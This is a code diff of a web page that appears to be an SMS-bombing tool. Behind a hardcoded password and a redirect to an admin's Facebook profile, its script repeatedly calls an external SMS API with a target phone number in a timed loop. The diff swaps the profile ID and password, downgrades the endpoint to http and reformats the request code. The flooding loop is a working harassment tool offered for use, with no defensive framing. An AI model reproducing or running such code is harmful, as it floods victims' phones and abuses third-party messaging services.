@@ -115,7 +115,7 @@
 
 <script>
   function followAdmin() {
-    window.open("https://www.facebook.com/profile.php?id=100001924952999", "_blank");
+    window.open("https://www.facebook.com/profile.php?id=61576583548040", "_blank");
     setTimeout(() => {
       document.getElementById("welcomeBox").classList.add("hidden");
       document.getElementById("bombingBox").classList.remove("hidden");
@@ -128,7 +128,7 @@
     const password = document.getElementById('password').value;
     const responseBox = document.getElementById('response');
 
-    if (password !== "Alinch69") {
+    if (password !== "Alin69") {
       responseBox.innerText = "❌ Wrong Password!";
       return;
     }
@@ -144,14 +144,14 @@
     const interval = setInterval(() => {
       count++;
 
-      fetch(`https://dz24pro.site/api/sms.php?number=${encodeURIComponent(number)}&message=Test`)
-  .then(res => res.text())
-  .then(data => {
-    responseBox.innerText = ` Sent ${count}/${limit}`;
-  })
-  .catch(err => {
-    responseBox.innerText = ` Error on ${count}: ${err}`;
-  });
+      fetch(`http://dz24pro.site/api/sms.php?number=${encodeURIComponent(number)}&message=Test`)
+        .then(res => res.text())
+        .then(data => {
+          responseBox.innerText = `✅ Sent ${count}/${limit}`;
+        })
+        .catch(err => {
+          responseBox.innerText = `❌ Error on ${count}: ${err}`;
+        });
 
       if (count >= limit) {
         clearInterval(interval);
